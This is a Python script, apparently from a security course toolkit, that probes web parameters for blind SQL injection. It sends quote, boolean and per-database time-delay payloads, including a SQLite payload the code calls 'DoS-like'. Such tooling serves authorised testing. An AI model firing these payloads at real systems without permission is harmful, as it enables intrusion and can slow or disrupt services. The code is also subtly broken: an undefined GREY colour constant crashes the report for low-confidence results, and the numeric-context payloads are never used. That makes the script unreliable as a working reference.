#!/usr/bin/env python3
"""
redshift_toolkit.web.sqli_oracle — boolean / time-based blind SQLi tester.

Methodology (matches Module 14)
-------------------------------
1. Baseline: send the request unmodified, record response (length, status,
   reflection of any value).
2. Quote test: append `'` and `''` — observe whether single quote breaks
   the response in a way that double quote restores. If yes, parameter is
   likely interpolated into a SQL string.
3. Boolean test: try `' AND '1'='1` (always-true) vs `' AND '1'='2`
   (always-false). If responses differ visibly, you have a boolean oracle.
4. Time test: per-DB time payloads. If the response is consistently delayed
   by the requested time and not by 0, you have time-based confirmation.
5. DB fingerprint: based on which time payload worked.

Important caveat
----------------
This script DETECTS SQL injection. It does NOT exfiltrate data en masse.
Data extraction requires careful handling per-target and is left to manual
work with sqlmap, which is the right tool for that job.

Usage
-----
  python3 -m redshift_toolkit.web.sqli_oracle \\
      --url 'https://app.example.com/?id=1'
  python3 -m redshift_toolkit.web.sqli_oracle \\
      --url 'https://app.example.com/api/search' --data 'q=foo' \\
      --params q

Author: Redshift Project — Module 14
License: MIT
"""

from __future__ import annotations

import argparse
import json
import sys
import time
from dataclasses import dataclass, asdict, field
from urllib.parse import urlsplit, parse_qsl, urlencode, urlunsplit

from redshift_toolkit.web.http_client import HttpRequest, send

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


# Time-based payloads per DB.
TIME_PAYLOADS = {
    "MySQL/MariaDB": "' AND SLEEP({s})-- -",
    "PostgreSQL":    "' AND pg_sleep({s})-- -",
    "MSSQL":         "'; WAITFOR DELAY '0:0:{s}'-- -",
    "Oracle":        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{s})='a'-- -",
    "SQLite":        "' AND randomblob(100000000)/0=0-- -",  # crude DoS-like; SQLite has no sleep
}

# Numeric-context variants (no quote breakout)
TIME_PAYLOADS_NUM = {
    "MySQL/MariaDB": " AND SLEEP({s})-- -",
    "PostgreSQL":    " AND pg_sleep({s})-- -",
    "MSSQL":         "; WAITFOR DELAY '0:0:{s}'-- -",
    "Oracle":        " AND DBMS_PIPE.RECEIVE_MESSAGE('a',{s})='a'-- -",
}


@dataclass
class Probe:
    label: str
    payload: str
    elapsed_ms: float = 0.0
    status: int = 0
    body_len: int = 0
    body_preview: str = ""


@dataclass
class Finding:
    parameter: str
    technique: str  # "boolean" or "time"
    db: str | None
    confidence: str  # "high" / "medium" / "low"
    notes: str
    probes: list[Probe] = field(default_factory=list)


def _replace_param_in_url(url: str, name: str, value: str) -> str:
    sp = urlsplit(url)
    qs = parse_qsl(sp.query, keep_blank_values=True)
    new = []
    replaced = False
    for k, v in qs:
        if k == name and not replaced:
            new.append((k, value))
            replaced = True
        else:
            new.append((k, v))
    if not replaced:
        new.append((name, value))
    return urlunsplit((sp.scheme, sp.netloc, sp.path, urlencode(new), sp.fragment))


def _replace_param_in_body(body: str, name: str, value: str) -> str:
    parts = parse_qsl(body, keep_blank_values=True)
    new = []
    replaced = False
    for k, v in parts:
        if k == name and not replaced:
            new.append((k, value))
            replaced = True
        else:
            new.append((k, v))
    if not replaced:
        new.append((name, value))
    return urlencode(new)


def _send(url: str, *, method: str = "GET", body: str | None = None,
          headers: list[tuple[str, str]] | None = None,
          tls_verify: bool = True, timeout: float = 30.0) -> tuple[int, bytes, float]:
    h = list(headers or [])
    if body is not None and not any(k.lower() == "content-type" for k, _ in h):
        h.append(("Content-Type", "application/x-www-form-urlencoded"))
    t0 = time.time()
    r = send(HttpRequest(method=method, url=url, headers=h, body=body),
             timeout=timeout, tls_verify=tls_verify, follow_redirects=False)
    return r.status, r.body, (time.time() - t0) * 1000


def _make_request(base_url: str, base_body: str | None, param: str,
                  payload: str, original_value: str,
                  numeric: bool = False) -> tuple[str, str | None]:
    new_value = (original_value + payload) if not numeric else (original_value + payload)
    if base_body is None:
        return _replace_param_in_url(base_url, param, new_value), None
    return base_url, _replace_param_in_body(base_body, param, new_value)


def test_param(url: str, param: str, *,
               body: str | None = None, method: str = "GET",
               headers: list[tuple[str, str]] | None = None,
               sleep_s: int = 5,
               tls_verify: bool = True,
               timeout: float = 30.0) -> Finding | None:
    """Run the full SQLi oracle for one parameter."""
    # Read original value
    if body is None:
        sp = urlsplit(url)
        qs = dict(parse_qsl(sp.query, keep_blank_values=True))
        original = qs.get(param, "1")
    else:
        bd = dict(parse_qsl(body, keep_blank_values=True))
        original = bd.get(param, "1")

    f = Finding(parameter=param, technique="", db=None, confidence="low",
                notes="", probes=[])

    # Baseline
    u, b = _make_request(url, body, param, "", original)
    s0, body0, t0 = _send(u, method=method, body=b, headers=headers,
                          tls_verify=tls_verify, timeout=timeout)
    f.probes.append(Probe(label="baseline", payload=original,
                          status=s0, body_len=len(body0), elapsed_ms=t0))

    # Quote test
    u, b = _make_request(url, body, param, "'", original)
    s1, body1, t1 = _send(u, method=method, body=b, headers=headers,
                          tls_verify=tls_verify, timeout=timeout)
    f.probes.append(Probe(label="single quote", payload=original + "'",
                          status=s1, body_len=len(body1), elapsed_ms=t1))

    quote_breaks = (s1 != s0) or (abs(len(body1) - len(body0)) > 100)

    # Boolean tests
    u, b = _make_request(url, body, param, "' AND '1'='1", original)
    s_t, body_t, _ = _send(u, method=method, body=b, headers=headers,
                           tls_verify=tls_verify, timeout=timeout)
    f.probes.append(Probe(label="bool true", payload=original + "' AND '1'='1",
                          status=s_t, body_len=len(body_t)))

    u, b = _make_request(url, body, param, "' AND '1'='2", original)
    s_f, body_f, _ = _send(u, method=method, body=b, headers=headers,
                           tls_verify=tls_verify, timeout=timeout)
    f.probes.append(Probe(label="bool false", payload=original + "' AND '1'='2",
                          status=s_f, body_len=len(body_f)))

    bool_diff = (s_t != s_f) or (abs(len(body_t) - len(body_f)) > 50)
    if bool_diff and quote_breaks:
        f.technique = "boolean"
        f.confidence = "high"
        f.notes = (f"baseline len={len(body0)}, true len={len(body_t)}, "
                   f"false len={len(body_f)} (Δ={len(body_t)-len(body_f)})")
        return f

    # Time-based tests
    detected_db = None
    time_evidence: list[Probe] = []
    for db, tmpl in TIME_PAYLOADS.items():
        payload = tmpl.format(s=sleep_s)
        u, b = _make_request(url, body, param, payload, original)
        try:
            s, body_, ms = _send(u, method=method, body=b, headers=headers,
                                 tls_verify=tls_verify,
                                 timeout=max(timeout, sleep_s + 5))
        except Exception:
            continue
        time_evidence.append(Probe(label=f"time {db}", payload=payload,
                                   status=s, body_len=len(body_), elapsed_ms=ms))
        if ms >= sleep_s * 1000 * 0.85:
            # Confirm by sending a 0-second variant
            payload0 = tmpl.format(s=0)
            u0, b0 = _make_request(url, body, param, payload0, original)
            _, _, ms0 = _send(u0, method=method, body=b0, headers=headers,
                              tls_verify=tls_verify, timeout=timeout)
            time_evidence.append(Probe(label=f"time {db} (s=0)", payload=payload0,
                                       elapsed_ms=ms0))
            if ms - ms0 >= sleep_s * 1000 * 0.7:
                detected_db = db
                break

    if detected_db:
        f.technique = "time"
        f.db = detected_db
        f.confidence = "high"
        f.notes = f"sleep({sleep_s}) consistently delayed response only with {detected_db} payload"
        f.probes.extend(time_evidence)
        return f

    f.probes.extend(time_evidence)

    if quote_breaks:
        f.technique = "quote-break"
        f.confidence = "low"
        f.notes = "single quote alters response, but boolean and time tests inconclusive"
        return f

    return None


def render_text(findings: list[Finding], color: bool) -> str:
    out = [paint("\n=== SQLi oracle results ===", BOLD, color)]
    if not findings:
        out.append(paint("  no SQLi indicators in the parameters tested.", GREEN, color))
        return "\n".join(out)
    for f in findings:
        sev = paint(f.confidence, RED if f.confidence == "high"
                    else YELLOW if f.confidence == "medium" else GREY, color)
        out.append(f"  [{sev}] {paint(f.parameter, BOLD, color)}: "
                   f"technique={f.technique}"
                   f"{', db=' + f.db if f.db else ''}")
        out.append(f"      {f.notes}")
        for p in f.probes[-4:]:  # last 4 probes
            out.append(f"      probe[{p.label}] status={p.status} "
                       f"len={p.body_len} t={p.elapsed_ms:.0f}ms")
    return "\n".join(out)


def main() -> int:
    ap = argparse.ArgumentParser(description="Boolean / time-based blind SQLi tester.")
    ap.add_argument("--url", required=True)
    ap.add_argument("--data", help="POST/PUT body, x-www-form-urlencoded")
    ap.add_argument("-X", "--method", default=None,
                    help="default: GET if no --data, POST if --data")
    ap.add_argument("--params", help="comma-separated parameter names to test "
                    "(default: all in URL or body)")
    ap.add_argument("-H", "--header", action="append", default=[],
                    help="header (repeatable)")
    ap.add_argument("--sleep", type=int, default=5,
                    help="time-based sleep duration (seconds)")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--timeout", type=float, default=30.0)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()
    color = sys.stdout.isatty() and not args.no_color and not args.json

    method = args.method or ("POST" if args.data else "GET")
    headers = []
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers.append((k.strip(), v.strip()))

    if args.params:
        params = [p.strip() for p in args.params.split(",") if p.strip()]
    elif args.data:
        params = [k for k, _ in parse_qsl(args.data, keep_blank_values=True)]
    else:
        sp = urlsplit(args.url)
        params = [k for k, _ in parse_qsl(sp.query, keep_blank_values=True)]

    if not params:
        print("[!] no parameters to test (use --params or include them in --url/--data)",
              file=sys.stderr)
        return 2

    findings: list[Finding] = []
    for p in params:
        if not args.json:
            print(paint(f"[*] testing parameter: {p}", BOLD, color))
        f = test_param(args.url, p, body=args.data, method=method,
                       headers=headers, sleep_s=args.sleep,
                       tls_verify=not args.insecure, timeout=args.timeout)
        if f:
            findings.append(f)

    if args.json:
        print(json.dumps([asdict(f) for f in findings], indent=2))
    else:
        print(render_text(findings, color))

    return 0 if not findings else 1


if __name__ == "__main__":
    sys.exit(main())
